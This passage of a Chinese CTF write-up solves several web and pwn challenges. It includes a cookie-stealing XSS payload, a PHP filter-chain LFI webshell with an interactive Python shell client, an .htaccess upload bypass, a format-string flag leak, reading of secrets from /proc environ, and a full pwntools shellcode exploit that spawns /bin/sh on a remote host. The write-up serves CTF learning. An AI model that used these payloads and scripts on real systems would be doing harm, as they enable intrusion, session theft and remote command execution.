        content = request.form.get("content", "")
        content = content.replace("<script", "").replace("</script", "")
        content = re.sub(r"\bon\w+\s*=", "", content)
        if content.strip():
            messages.append({"name": poster, "content": content})
        return redirect(url_for("guestbook"))
    return render_template("guestbook.html", messages=messages)


@app.route("/admin", methods=["GET", "POST"])
def admin():
    global announcement
    if not is_admin():
        return redirect(url_for("login"))
    if request.method == "POST":
        new = request.form.get("announcement", "")
        if new.strip():
            announcement = new
            return redirect(url_for("admin"))
    return render_template(
        "admin.html",
        announcement=render_announcement(),
        announcement_source=announcement,
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```

admin 的密码在环境变量中，我们无法直接获取 admin 的密码。

其中 `/guestbook` 这个路由中只有对 XSS 的简单过滤，由于缺乏对 `{{}}` 的过滤，这样会导致 SSTI 漏洞。

不过我们现在还无法访问 admin 界面所以我们先到主页看看。

![](https://img.halfcity.top/2026/11/11/61bbf2790927cd2a2463f2eaca393213.avif)

![](https://img.halfcity.top/2026/11/11/d2e6544a29470c25e6e17b4d733cc729.avif)

这里有一个留言板，使用 img 标签测试 XSS 发现直接成功了，这不是过滤了个滚木嘛。

思考一下留言接口没有限制，通过 XSS 可以控制 admin 留下他的 cookie。

payload 如下：

```html
<img src=x OnErRoR="fetch('/guestbook',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'content='+encodeURIComponent(document.cookie)})">
```

输入后等待一下刷新就能看 admin 的 cookie 了：

![](https://img.halfcity.top/2026/11/11/2ee7ac8459a6db6a92e6bd894feae938.avif)

来到 admin 页面，回想起之前看代码有观察到 SSTI，那么这里其实就是 pyjail 的部分了。

先测测简单的 payload：

![](https://img.halfcity.top/2026/11/11/dbafe529ceb73552c83354acda383cc1.avif)

非常好一遍过了，直接读 flag：

![](https://img.halfcity.top/2026/11/11/f23149ceb05aac0d68e30d85ef03e256.avif)

```txt
flag{MoNIT0RlNG-CR3@TivE-Innov4Ti0N_PlAtf0RM96a}
```

### 大爷模拟器

题目给了附件不过似乎只是启动环境的工具？至少现在似乎没有什么作用，我们先放一放。

来到主页：

![](https://img.halfcity.top/2026/11/11/38fbaf476ccb2c7c0c997115668f6a0f.avif)

非常丑的主页，同时点击 view 可以看到一些梗视频。

另外我们可以注意到 `index.php?page=home` 这里的参数，猜测可能存在 LFI 漏洞。

我们可以测试一下利用 php 的 filter 协议进行利用，期待获取一个 webshell。

这里我将使用[这个工具](https://github.com/synacktiv/php_filter_chain_generator)生成 payload： 

```bash
> python php_filter_chain_generator.py --chain "<?php system($_GET['c']); ?>"
[+] The following gadget chain will generate the following code : <?php system($_GET['c']); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index&c=ls ..
```

随后我们就可以测试一下：

![](https://img.halfcity.top/2026/11/11/1841ee7275fbb6e6b53ee420c76ca830.avif)

可以看到成功利用，并且尾随了一段意义不明的字符串。

由于实例可能不能外连所以我们不能开一个穿透弹 shell 回来，不过我们可以直接写一个非交互式的 webshell：

```py
import requests
import re
import sys
from urllib.parse import quote, urlencode

TARGET = "http://110.42.112.160:20459/index.php"

FILTER_CHAIN = (
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|"
    "convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|"
    "convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|"
    "convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|"
    "convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|"
    "convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
    "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|"
    "convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|"
    "convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|"
    "convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
    "convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|"
    "convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
    "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|"
    "convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|"
    "convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|"
    "convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
    "convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|"
    "convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
    "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|"
    "convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|"
    "convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|"
    "convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|"
    "convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|"
    "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
    "convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|"
    "convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
    "convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|"
    "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index"
)

_ENCODED_CHAIN = quote(FILTER_CHAIN, safe="")

SESSION = requests.Session()

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """执行命令并返回输出"""
    url = f"{TARGET}?page={_ENCODED_CHAIN}&c={quote(cmd, safe='')}"
    try:
        r = SESSION.get(url, timeout=timeout)
    except requests.RequestException as e:
        return f"[!] 请求失败: {e}"

    body = r.text

    lines = []
    for line in body.splitlines():
        s = line.strip()
        if not s:
            continue
        if s.startswith("Warning:") or s.startswith("Notice:") \
           or s.startswith("Deprecated:") or s.startswith("Fatal error:"):
            continue
        if "<br" in s or "<b>" in s:
            # 去掉 HTML 标签
            s = re.sub(r"<[^>]+>", "", s).strip()
            if not s:
                continue
        lines.append(s)

    lines = lines[:-1]

    return "\n".join(lines) if lines else "[空输出]"


def main():
    out = run_cmd("id")
    print(f"[*] id => {out}\n")

    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] 退出")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            print("[*] 退出")
            break

        result = run_cmd(cmd)
        print(result)
        print()


if __name__ == "__main__":
    main()
```

不过一番查找我们似乎怎么都找不到 flag 在哪里。

这个时候回忆一下，似乎给的附件我们还没用呢，附件里面有一个 git 仓库我们还没看过。

![](https://img.halfcity.top/2026/11/11/b7bf3ee0b709bc44f96878f8eb0ce71c.avif)

![](https://img.halfcity.top/2026/11/11/9fa84a967902967ed3ac54191448fe75.avif)

这里我们就可以明显地看到 docker 脚本中在 FLAG 环境变量存在时候启动了这个程序 `/usr/local/bin/device-agent` 随后将 FLAG 删除。

所以我们可以在这个程序的内存中找到 flag：

```bash
shell> ps -ef | grep device-agent
www-data       7       1  0 02:42 ?        00:00:00 /bin/sh /usr/local/bin/device-agent
www-data     180      22  0 03:13 ?        00:00:00 sh -c -- ps -ef | grep device-agent
www-data     182     180  0 03:13 ?        00:00:00 grep device-agent
shell> cat /proc/7/environ | tr '\0' '\n' | grep FLAG
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
FLAG=flag{06d2322d-24dd-73eb-3637-0228e698139b}
```

```txt
flag{06d2322d-24dd-73eb-3637-0228e698139b}
```

### ez_upload

这里说管理员才可以登录，我们看看 cookie 发现 role 中使用 base64 编码了角色字符串：

![](https://img.halfcity.top/2026/11/11/848fab5e2ec28051fc57a50ecf59c9c1.avif)我们直接伪造一个：

![](https://img.halfcity.top/2026/11/11/6d61b22a772c88716d68b226f90bc38d.avif)

![](https://img.halfcity.top/2026/11/11/3fe5c2b3ad6eaa53148f889808d61558.avif)

这里似乎不让文件中有 `?`，并且经过测试似乎存在后缀白名单校验。

![](https://img.halfcity.top/2026/11/11/f958d4b81d6e10c835f5edc0eab7f1f7.avif)

![](https://img.halfcity.top/2026/11/11/c733756361f54eb12c099299be19950e.avif)

不过我发现 `.htaccess` 文件是可以上传的，同时服务器还是 apache，这样我们就可以控制文件类型的解析，对于内容我们可以尝试使用 script 标签绕过。

文件如下：

```bash
❯ cat poc.jpg
<script language="php">system('cat /flag');</script>

❯ cat .htaccess
SetHandler application/x-httpd-php
```

![](https://img.halfcity.top/2026/11/11/5a757f90f077e177ccb8d012bca41420.avif)

```txt
flag{y0u_c@n_N0w_up1o@d_@Ny_fi1e}
```

## Pwn

### 未公开手稿

检查一下题目：

```c
void __cdecl printer()
{
  char input[256]; // [rsp+10h] [rbp-1E0h] BYREF
  unsigned __int64 stack_cache[16]; // [rsp+110h] [rbp-E0h] BYREF
  char flag_cache[64]; // [rsp+190h] [rbp-60h] BYREF
  size_t flag_len; // [rsp+1D8h] [rbp-18h]
  const char *flag; // [rsp+1E0h] [rbp-10h]
  size_t i; // [rsp+1E8h] [rbp-8h]

  memset(flag_cache, 0, sizeof(flag_cache));
  stack_cache[0] = 0x1111111111111111LL;
  qmemcpy(&stack_cache[1], "\"\"\"\"\"\"\"\"33333333DDDDDDDDUUUUUUUU", 32);
  stack_cache[5] = 0xAAAAAAAAAAAAAAAALL;
  stack_cache[6] = 0xBBBBBBBBBBBBBBBBLL;
  stack_cache[7] = 0xCCCCCCCCCCCCCCCCLL;
  memset(&stack_cache[8], 0, 64);
  flag = getenv(name: "FLAG");
  if ( flag && *flag )
  {
    flag_len = strlen(s: flag);
    if ( flag_len <= 0x3F )
    {
      memcpy(dest: flag_cache, src: flag, n: flag_len);
      for ( i = 0; i <= 7; ++i )
        stack_cache[i + 8] = *(_QWORD *)&flag_cache[8 * i];
      unsetenv(name: "FLAG");
      flag = 0;
      setvbuf(stream: stdout, buf: 0, modes: 2, n: 0);
      puts(s: asc_402044);
      puts(s: &s_);
      while ( 1 )
      {
        fwrite(ptr: &ptr_, size: 1u, n: 8u, s: stdout);
        if ( !fgets(s: input, n: 256, stream: stdin) )
          break;
        input[strcspn(s: input, reject: "\n")] = 0;
        if ( !strcmp(s1: input, s2: "quit") )
          break;
        if ( input[0] )
        {
          if ( contains_write_conversion(s: input) )
          {
            puts(s: &s__0);
          }
          else
          {
            printf(format: input);
            putchar(c: 10);
          }
        }
      }
    }
    else
    {
      fwrite(ptr: &ptr__0, size: 1u, n: 0xCu, s: stderr);
    }
  }
  else
  {
    fwrite(ptr: &ptr__1, size: 1u, n: 0xFu, s: stderr);
  }
}
```

注意这里 `printf(format: input)` 存在明显的格式化字符串漏洞。

栈上的变量 `flag_cache` 应该就是我们的目标，所以我们只需要不停地试向后找偏移直到找到 flag 为止。

经过尝试发现 flag 位于 vargs 偏移 48 处：

```bash
输入> %48$lx.%49$lx.%50$lx.%51$lx.%52$lx.%53$lx.%54$lx.%55$lx.%56$lx.%57$lx.%58$lx.%59$lx.%60$lx.%61$lx.%62$lx.%63$lx
3766637b67616c66.61612d3135336161.2d616438312d6337.6563382d36633063.3935313430393766.7d66.0.0.3766637b67616c66.61612d3135336161.2d616438312d6337.6563382d36633063.3935313430393766.7d66.0.0
```

0x66 对应 f，小端序来看这就是 flag 的开头。

简单提取一下：

```py
leaks = [
    0x3766637b67616c66,
    0x61612d3135336161,
    0x2d616438312d6337,
    0x6563382d36633063,
    0x3935313430393766,
    0x7d66,
]

flag = b""

for val in leaks:
    chunk = val.to_bytes(8, byteorder="little")
    flag += chunk

flag = flag.rstrip(b"\x00")

print("FLAG:", flag.decode())
```

输出如下：

```txt
> python decode.py
FLAG: flag{cf7aa351-aa7c-18da-c0c6-8cef7904159f}
```

```txt
flag{cf7aa351-aa7c-18da-c0c6-8cef7904159f}
```

### Shellcode;Gate

![](https://img.halfcity.top/2026/11/11/8f814043fd47015a022e5be1819bc7a6.avif)

![](https://img.halfcity.top/2026/11/11/83d9e26de08251356f4b502029d6c231.avif)

这里先申请了一页 RWX 的内存，随后向 buf 中读取了 15 字节的数据并进入 `clean_and_jump()`，这个函数。

在这个函数中 buf 的前八个字节被自己的地址填充，随后这里跳过了前八个字节并绕了一圈将跳过八个字节后的地址 push 并将除了放置 buf 地址的 r15 寄存器全部清空人然后 ret 到后面的 shellcode。

我们有 7 个字节的空间可以使用，同时在 r15 还有 buf 自己的地址。

此时我们的状态是：

- rax：0  
- rdi：0
- rsi：0
- rdx：0

距离 read 的 syscall 只差 rdi 和 rdx，7 字节的空间刚好足够补全参数并 syscall。

随后读取 stage2 补全到 stage1 后面即可。

exp 如下：

```py
from pwn import *

exe = ELF("./pwn")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 36879)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b"Submit your shellcode:\n")

    stage1 = b'A' * 8 + asm('''
        mov rsi, r15        # rsi = buf
        mov dh, 0x10        # rdx = 0x1000
        syscall             # read(0, buf, 0x1000)
    ''')
    send(stage1)

    shellcode = asm('''
        xor esi, esi        # argv = NULL
        xor edx, edx        # envp = NULL
        push 59             # sys_execve
        pop rax
        mov rdi, r15        # rdi = buf
        syscall
    ''')
    stage2 = b'/bin/sh\x00' + b'B' * 7 + shellcode
    send(stage2)

    interactive()


if __name__ == "__main__":
    main()
```

输出如下：

```py
❯ python exp.py
[*] '/home/halfcity/Desktop/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 36879: Done
[DEBUG] Received 0x3d bytes:
    b'Only chosen bytes may cross the gate.\n'
    b'Submit your shellcode:\n'
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
            mov rsi, r15 # rsi = buf
            mov dh, 0x10 # rdx = 0x1000
            syscall # read(0, buf, 0x1000)
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/6d1550961e53f0ff6751a703cddf255b4ed8b56d'
[*] sending payload: b'AAAAAAAAL\x89\xfe\xb6\x10\x0f\x05'
[DEBUG] Sent 0xf bytes:
    00000000  41 41 41 41  41 41 41 41  4c 89 fe b6  10 0f 05     │AAAA│AAAA│L···│···│
    0000000f
[+] payload sent
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
            xor esi, esi # argv = NULL
            xor edx, edx # envp = NULL
            push 59 # sys_execve
            pop rax
            mov rdi, r15 # rdi = buf\U0000ff0c\U00006307\U00005411 "/bin/sh"
            syscall
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/cc35488d3af9f47f4e8d9ad0c76046e653842669'
[*] sending payload: b'/bin/sh\x00BBBBBBB1\xf61\xd2j;XL\x89\xff\x0f\x05'
[DEBUG] Sent 0x1b bytes:
    00000000  2f 62 69 6e  2f 73 68 00  42 42 42 42  42 42 42 31  │/bin│/sh·│BBBB│BBB1│
    00000010  f6 31 d2 6a  3b 58 4c 89  ff 0f 05                  │·1·j│;XL·│···│
    0000001b
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2d bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libs\n'
    b'pwn\n'
    b'secret\n'
bin
dev
flag
lib
lib32
lib64
libs
pwn
secret
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2a bytes:
    b'flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}'
flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}
```

```txt
flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}
```

### 宇宙射线·一

这个题目比较特殊它允许我们修改服务端进程指定偏移处一字节的内容。

我们先看题目：

![](https://img.halfcity.top/2026/11/11/e874096ce8165ab48d4485aaece2b363.avif)

```c
read(fd: 0, buf: buf, nbytes: 240u);
```

这一行有明显的溢出，但是我们没有办法泄露 canary。

我们看看汇编：

```asm
.text:00000000000011BD                    ; Attributes: bp-based frame
.text:00000000000011BD
.text:00000000000011BD                    ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:00000000000011BD                                    public main
.text:00000000000011BD                    main            proc near               ; DATA XREF: _start+18↑o
.text:00000000000011BD
.text:00000000000011BD                    buf             = byte ptr -60h
.text:00000000000011BD                    var_8           = qword ptr -8
.text:00000000000011BD
